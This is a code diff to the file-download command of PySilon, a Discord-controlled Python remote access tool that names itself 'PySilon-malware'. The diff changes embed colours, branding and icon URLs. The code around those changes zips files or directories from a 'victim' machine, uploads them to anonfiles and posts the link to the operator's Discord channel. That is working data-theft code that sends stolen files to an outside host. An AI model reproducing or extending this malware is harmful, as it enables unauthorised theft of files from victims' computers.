@@ -16,9 +16,8 @@ elif message.content[:9] == '.download':
     await message.delete()
     if message.channel.id == channel_ids['file']:
         if message.content == '.download':
-            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=0x8B0000)
-            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
             
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         else:
@@ -32,9 +31,8 @@ elif message.content[:9] == '.download':
                             except Exception as e:
                                 message.channel.send(e)
                                 pass
-                    embed = discord.Embed(title="🟢 Succsess",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=0x013220)
-                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    embed = discord.Embed(title="🟢 Success",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
+                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                     
                     await message.channel.send(embed=embed)
                     files = {
@@ -47,9 +45,8 @@ elif message.content[:9] == '.download':
                     await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
 
                 else:
-                    embed = discord.Embed(title="🟢 Succsess",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=0x013220)
-                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    embed = discord.Embed(title="🟢 Success",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
+                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                     
                     await message.channel.send(embed=embed)
                     files = {
@@ -64,15 +61,13 @@ elif message.content[:9] == '.download':
                     await message.channel.send(f"```{message.content[10:]}:``` {data['data']['file']['url']['short']}")
 
             else:
-                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=0x8B0000)
-                embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
+                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                 
 
                 reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     else:
-        embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=0x8B0000)
-        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
